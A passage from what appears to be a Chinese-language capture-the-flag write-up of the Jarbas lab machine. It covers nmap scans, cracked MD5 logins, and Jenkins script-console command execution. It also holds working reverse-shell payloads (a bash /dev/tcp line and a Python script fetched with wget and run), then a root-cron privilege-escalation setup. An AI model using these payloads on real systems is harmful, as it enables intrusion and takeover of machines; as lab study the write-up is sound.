</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 7.80 seconds
</span></span></code></pre></td></tr></table></div></div><p>拿到了一些版本的信息和操作系统的信息，再尝试udp</p><h4 id=udp扫描>UDP扫描</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ sudo nmap -sU -p22,80,3306,8080 192.168.152.133
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:27 EDT
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.152.133
</span></span><span class=line><span class=cl>Host is up (0.00031s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE  SERVICE
</span></span><span class=line><span class=cl>22/udp   closed ssh
</span></span><span class=line><span class=cl>80/udp   closed http
</span></span><span class=line><span class=cl>3306/udp closed mysql
</span></span><span class=line><span class=cl>8080/udp closed http-alt
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:CD:D8:CF (VMware)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
</span></span></code></pre></td></tr></table></div></div><p>udp协议全部是关着的，无有效信息，开始尝试脚本扫描</p><h4 id=vuln脚本扫描>vuln脚本扫描</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ sudo nmap --script=vuln -p22,80,3306,8080 192.168.152.133
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:28 EDT
</span></span><span class=line><span class=cl>Nmap scan report for 192.168.152.133
</span></span><span class=line><span class=cl>Host is up (0.00029s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp   open  ssh
</span></span><span class=line><span class=cl>80/tcp   open  http
</span></span><span class=line><span class=cl>|_http-trace: TRACE is enabled
</span></span><span class=line><span class=cl>| http-enum: 
</span></span><span class=line><span class=cl>|_  /icons/: Potentially interesting folder w/ directory listing
</span></span><span class=line><span class=cl>| http-sql-injection: 
</span></span><span class=line><span class=cl>|   Possible sqli for queries:
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DD%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DD%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DD%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/njarb_data/?C=S%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/njarb_data/?C=M%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|     http://192.168.152.133:80/index_arquivos/njarb_data/?C=N%3BO%3DD%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|_    http://192.168.152.133:80/index_arquivos/njarb_data/?C=D%3BO%3DA%27%20OR%20sqlspider
</span></span><span class=line><span class=cl>|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.
</span></span><span class=line><span class=cl>| http-csrf: 
</span></span><span class=line><span class=cl>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.152.133
</span></span><span class=line><span class=cl>|   Found the following possible CSRF vulnerabilities: 
</span></span><span class=line><span class=cl>|   
</span></span><span class=line><span class=cl>|     Path: http://192.168.152.133:80/
</span></span><span class=line><span class=cl>|     Form id: wmtb
</span></span><span class=line><span class=cl>|     Form action: /web/submit
</span></span><span class=line><span class=cl>|   
</span></span><span class=line><span class=cl>|     Path: http://192.168.152.133:80/
</span></span><span class=line><span class=cl>|     Form id: 
</span></span><span class=line><span class=cl>|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php
</span></span><span class=line><span class=cl>|   
</span></span><span class=line><span class=cl>|     Path: http://192.168.152.133:80/
</span></span><span class=line><span class=cl>|     Form id: 
</span></span><span class=line><span class=cl>|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/
</span></span><span class=line><span class=cl>|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.
</span></span><span class=line><span class=cl>3306/tcp open  mysql
</span></span><span class=line><span class=cl>8080/tcp open  http-proxy
</span></span><span class=line><span class=cl>| http-enum: 
</span></span><span class=line><span class=cl>|_  /robots.txt: Robots file
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:CD:D8:CF (VMware)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 37.80 seconds
</span></span></code></pre></td></tr></table></div></div><p>通过脚本扫描的信息，可以看到明显是需要以80端口，也就是我们常规的web服务去做主要的突破口，</p><p><strong>注意</strong></p><p>记得随时将自己的信息整理记录，以防在下一步找不到突破口的时候，可以及时返回查询。或者是防备自己在扫描过程中有所遗漏。</p><h3 id=目录爆破>目录爆破</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>┌──(kali㉿kali)-[~/桌面]
</span></span><span class=line><span class=cl>└─$ dirsearch -u 192.168.152.133    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  _|. _ _  _  _  _ _|_    v0.4.3
</span></span><span class=line><span class=cl> (_||| _) (/_(_|| (_| )
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Output File: /home/kali/桌面/reports/_192.168.152.133/_24-03-12_22-43-47.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Target: http://192.168.152.133/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[22:43:47] Starting: 
</span></span><span class=line><span class=cl>[22:43:49] 403 -  213B  - /.ht_wsr.txt                                  
</span></span><span class=line><span class=cl>[22:43:49] 403 -  216B  - /.htaccess.bak1                               
</span></span><span class=line><span class=cl>[22:43:49] 403 -  216B  - /.htaccess.orig                               
</span></span><span class=line><span class=cl>[22:43:49] 403 -  216B  - /.htaccess.save
</span></span><span class=line><span class=cl>[22:43:49] 403 -  217B  - /.htaccess_extra                              
</span></span><span class=line><span class=cl>[22:43:49] 403 -  214B  - /.htaccess_sc
</span></span><span class=line><span class=cl>[22:43:49] 403 -  214B  - /.htaccessOLD
</span></span><span class=line><span class=cl>[22:43:49] 403 -  214B  - /.htaccessBAK
</span></span><span class=line><span class=cl>[22:43:49] 403 -  215B  - /.htaccessOLD2
</span></span><span class=line><span class=cl>[22:43:49] 403 -  216B  - /.htaccess_orig
</span></span><span class=line><span class=cl>[22:43:49] 403 -  207B  - /.html                                        
</span></span><span class=line><span class=cl>[22:43:49] 403 -  218B  - /.htaccess.sample
</span></span><span class=line><span class=cl>[22:43:49] 403 -  206B  - /.htm                                         
</span></span><span class=line><span class=cl>[22:43:49] 403 -  216B  - /.htpasswd_test
</span></span><span class=line><span class=cl>[22:43:49] 403 -  213B  - /.httr-oauth
</span></span><span class=line><span class=cl>[22:43:49] 403 -  212B  - /.htpasswds
</span></span><span class=line><span class=cl>[22:43:53] 200 -  359B  - /access.html                                  
</span></span><span class=line><span class=cl>[22:44:00] 403 -  210B  - /cgi-bin/                                     
</span></span><span class=line><span class=cl>                                                                         
</span></span><span class=line><span class=cl>Task Completed
</span></span></code></pre></td></tr></table></div></div><p>仅发现有一个access.html是开放的</p><h2 id=web渗透>Web渗透</h2><p>查看80端口是一个Jarbas服务</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-2gxJDRXP3V4KYsW-20250303144339-2hkxjv7.png alt>​</p><p>查看8080端口</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-ID6fcVFHhSTXUol-20250303144339-sikasbp.png alt>​</p><p>同时在之前的扫描过程中，其实还存在一个robots.txt，存在以下信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl># we don&#39;t want robots to click &#34;build&#34; links
</span></span><span class=line><span class=cl>User-agent: *
</span></span><span class=line><span class=cl>Disallow: /
</span></span></code></pre></td></tr></table></div></div><p>在目录扫描的过程中，发现存在以下页面</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-dKJ1lafuNLXStEi-20250303144339-ued4wdy.png alt>​</p><p>将信息进行保留</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>tiago:5978a63b4654c73c60fa24f836386d87
</span></span><span class=line><span class=cl>trindade:f463f63616cb3f1e81ce46b39f882fd5
</span></span><span class=line><span class=cl>eder:9b38e2b1e8b12f426b0d208a7ab6cb98
</span></span></code></pre></td></tr></table></div></div><p>将上述的信息进行查询</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>tiago:italia99
</span></span><span class=line><span class=cl>trindade:marianna
</span></span><span class=line><span class=cl>eder:vipsu
</span></span></code></pre></td></tr></table></div></div><p>使用<code>eder:vipsu</code>​成功登录，另外两个账户均显示登录无效，来到了Jenkins的后台界面。</p><p>通过我本地存储的一些漏洞库，可以看到该系统还是有不少利用点的，挨个尝试。</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-36JzyKR2BQToiSb-20250303144339-t5xavwa.png alt>​</p><p>”系统管理”功能，脚本命令行的远程命令执行漏洞直接利用成功。</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/network-asset-3pZVEsWO2bjQX6l-20250303144340-c74xiol.png alt>​</p><p>简单看了一下其他两个漏洞，但是估计连命令行这个都没修复，其他两个应该也都能能打通，暂时没去尝试。</p><p>开始尝试反弹shell，先开启监听</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>nc -lnvp 1234
</span></span></code></pre></td></tr></table></div></div><p>然后尝试执行命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>println &#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.152.132/1234 &lt;&amp;1&#39;&#34;.execute().text
</span></span></code></pre></td></tr></table></div></div><p>直接进行反弹shell命令的执行，攻击机kali并没有接受到反弹shell，除了bash，也尝试过了netcat的，都失败了</p><p>在经过网上查询后，尝试另一种思路，先在本机开启一个web服务</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>python3 -m http.server 80
</span></span></code></pre></td></tr></table></div></div><p>然后新建一个shell.py，更换ip和端口</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>#!/usr/bin/python
</span></span><span class=line><span class=cl># This is a Python reverse shell script
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>import socket,subprocess,os;
</span></span><span class=line><span class=cl>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
</span></span><span class=line><span class=cl>s.connect((&#34;192.168.152.131&#34;,1234));
</span></span><span class=line><span class=cl>os.dup2(s.fileno(),0);
</span></span><span class=line><span class=cl>os.dup2(s.fileno(),1);
</span></span><span class=line><span class=cl>os.dup2(s.fileno(),2);
</span></span><span class=line><span class=cl>p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);
</span></span></code></pre></td></tr></table></div></div><p>开始执行命令，利用wegt去下载shell.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>println &#34;wget http://192.168.152.131/shell.py -P /tmp/&#34;.execute().text
</span></span></code></pre></td></tr></table></div></div><p>此时暂时无回显，再次输入命令执行，不太确定是python3还是python成功执行反弹了shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>println &#34;python3 /tmp/shell.py&#34;.execute().text
</span></span><span class=line><span class=cl>println &#34;python /tmp/shell.py&#34;.execute().text
</span></span></code></pre></td></tr></table></div></div><h2 id=提权>提权</h2><p>拿到一个用户后，先进行枚举，确认自身状态</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>sh-4.2$ whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>jenkins
</span></span><span class=line><span class=cl>sh-4.2$ uname -a
</span></span><span class=line><span class=cl>uname -a
</span></span><span class=line><span class=cl>Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
</span></span><span class=line><span class=cl>sh-4.2$ sudo -l
</span></span><span class=line><span class=cl>sudo -l
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We trust you have received the usual lecture from the local System
</span></span><span class=line><span class=cl>Administrator. It usually boils down to these three things:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    #1) Respect the privacy of others.
</span></span><span class=line><span class=cl>    #2) Think before you type.
</span></span><span class=line><span class=cl>    #3) With great power comes great responsibility.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo: no tty present and no askpass program specified
</span></span></code></pre></td></tr></table></div></div><p>因为知道靶机上存在python，所以再提升一下交互性</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</span></span></code></pre></td></tr></table></div></div><p>继续枚举，先前的sudo和用户信息都无有效信息可以利用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>bash-4.2$ cd etc
</span></span><span class=line><span class=cl>cd etc
</span></span><span class=line><span class=cl>bash-4.2$ ls
</span></span><span class=line><span class=cl>ls
</span></span><span class=line><span class=cl>adjtime                  inittab                   profile.d
</span></span><span class=line><span class=cl>aliases                  inputrc                   protocols
</span></span><span class=line><span class=cl>aliases.db               iproute2                  python
</span></span><span class=line><span class=cl>alternatives             issue                     rc0.d
</span></span><span class=line><span class=cl>anacrontab               issue.net                 rc1.d
</span></span><span class=line><span class=cl>asound.conf              java                      rc2.d
</span></span><span class=line><span class=cl>audisp                   jvm                       rc3.d
</span></span><span class=line><span class=cl>audit                    jvm-commmon               rc4.d
</span></span><span class=line><span class=cl>bash_completion.d        kdump.conf                rc5.d
</span></span><span class=line><span class=cl>bashrc                   kernel                    rc6.d
</span></span><span class=line><span class=cl>binfmt.d                 krb5.conf                 rc.d
</span></span><span class=line><span class=cl>centos-release           krb5.conf.d               rc.local
</span></span><span class=line><span class=cl>centos-release-upstream  ld.so.cache               redhat-release
</span></span><span class=line><span class=cl>chkconfig.d              ld.so.conf                resolv.conf
</span></span><span class=line><span class=cl>chrony.conf              ld.so.conf.d              rpc
</span></span><span class=line><span class=cl>chrony.keys              libaudit.conf             rpm
</span></span><span class=line><span class=cl>cron.d                   libnl                     rsyslog.conf
</span></span><span class=line><span class=cl>cron.daily               libuser.conf              rsyslog.d
</span></span><span class=line><span class=cl>cron.deny                locale.conf               rwtab
</span></span><span class=line><span class=cl>cron.hourly              localtime                 rwtab.d
</span></span><span class=line><span class=cl>cron.monthly             login.defs                sasl2
</span></span><span class=line><span class=cl>crontab                  logrotate.conf            script
</span></span><span class=line><span class=cl>cron.weekly              logrotate.d               securetty
</span></span><span class=line><span class=cl>crypttab                 lvm                       security
</span></span><span class=line><span class=cl>csh.cshrc                machine-id                selinux
</span></span><span class=line><span class=cl>csh.login                magic                     services
</span></span><span class=line><span class=cl>dbus-1                   mailcap                   sestatus.conf
</span></span><span class=line><span class=cl>default                  makedumpfile.conf.sample  shadow
</span></span><span class=line><span class=cl>depmod.d                 man_db.conf               shadow-
</span></span><span class=line><span class=cl>dhcp                     maven                     shells
</span></span><span class=line><span class=cl>DIR_COLORS               mime.types                skel
</span></span><span class=line><span class=cl>DIR_COLORS.256color      mke2fs.conf               ssh
</span></span><span class=line><span class=cl>DIR_COLORS.lightbgcolor  modprobe.d                ssl
</span></span><span class=line><span class=cl>dracut.conf              modules-load.d            statetab
</span></span><span class=line><span class=cl>dracut.conf.d            motd                      statetab.d
</span></span><span class=line><span class=cl>e2fsck.conf              mtab                      subgid
</span></span><span class=line><span class=cl>environment              my.cnf                    subuid
</span></span><span class=line><span class=cl>ethertypes               my.cnf.d                  sudo.conf
</span></span><span class=line><span class=cl>exports                  nanorc                    sudoers
</span></span><span class=line><span class=cl>favicon.png              NetworkManager            sudoers.d
</span></span><span class=line><span class=cl>filesystems              networks                  sudo-ldap.conf
</span></span><span class=line><span class=cl>firewalld                nsswitch.conf             sysconfig
</span></span><span class=line><span class=cl>fonts                    nsswitch.conf.bak         sysctl.conf
</span></span><span class=line><span class=cl>fstab                    openldap                  sysctl.d
</span></span><span class=line><span class=cl>gcrypt                   opt                       systemd
</span></span><span class=line><span class=cl>GeoIP.conf               os-release                system-release
</span></span><span class=line><span class=cl>GeoIP.conf.default       pam.d                     system-release-cpe
</span></span><span class=line><span class=cl>gnupg                    passwd                    terminfo
</span></span><span class=line><span class=cl>GREP_COLORS              passwd-                   tmpfiles.d
</span></span><span class=line><span class=cl>groff                    php.d                     tuned
</span></span><span class=line><span class=cl>group                    php-fpm.conf              udev
</span></span><span class=line><span class=cl>group-                   php-fpm.d                 vconsole.conf
</span></span><span class=line><span class=cl>grub2.cfg                php.ini                   vimrc
</span></span><span class=line><span class=cl>grub.d                   pkcs11                    virc
</span></span><span class=line><span class=cl>gshadow                  pki                       wgetrc
</span></span><span class=line><span class=cl>gshadow-                 plymouth                  wpa_supplicant
</span></span><span class=line><span class=cl>gss                      pm                        X11
</span></span><span class=line><span class=cl>host.conf                polkit-1                  xdg
</span></span><span class=line><span class=cl>hostname                 popt.d                    xinetd.d
</span></span><span class=line><span class=cl>hosts                    postfix                   yum
</span></span><span class=line><span class=cl>hosts.allow              ppp                       yum.conf
</span></span><span class=line><span class=cl>hosts.deny               prelink.conf.d            yum.repos.d
</span></span><span class=line><span class=cl>httpd                    printcap
</span></span><span class=line><span class=cl>init.d                   profile
</span></span></code></pre></td></tr></table></div></div><p>在crontab中发现存在使用root权限去运行的脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>bash-4.2$ cat crontab                              
</span></span><span class=line><span class=cl>cat crontab
</span></span><span class=line><span class=cl>SHELL=/bin/bash
</span></span><span class=line><span class=cl>PATH=/sbin:/bin:/usr/sbin:/usr/bin
</span></span><span class=line><span class=cl>MAILTO=root
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># For details see man 4 crontabs
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># Example of job definition:
</span></span><span class=line><span class=cl># .---------------- minute (0 - 59)
</span></span><span class=line><span class=cl># |  .------------- hour (0 - 23)
</span></span><span class=line><span class=cl># |  |  .---------- day of month (1 - 31)
</span></span><span class=line><span class=cl># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
</span></span><span class=line><span class=cl># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
</span></span><span class=line><span class=cl># |  |  |  |  |
</span></span><span class=line><span class=cl># *  *  *  *  * user-name  command to be executed
</span></span><span class=line><span class=cl>*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1
</span></span></code></pre></td></tr></table></div></div><p>查看脚本的详细内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>bash-4.2$ cat ./script/CleaningScript.sh
</span></span><span class=line><span class=cl>cat ./script/CleaningScript.sh
</span></span><span class=line><span class=cl>#!/bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>rm -rf /var/log/httpd/access_log.txt
</span></span></code></pre></td></tr></table></div></div><p>就是一条定时清理访问日志的shell脚本，但是给予了root那么高的权限，就可以尝试去利用。</p><p>先开启新的监听端口</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>nc -lnvp 3333
</span></span></code></pre></td></tr></table></div></div><p>向脚本中写入命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
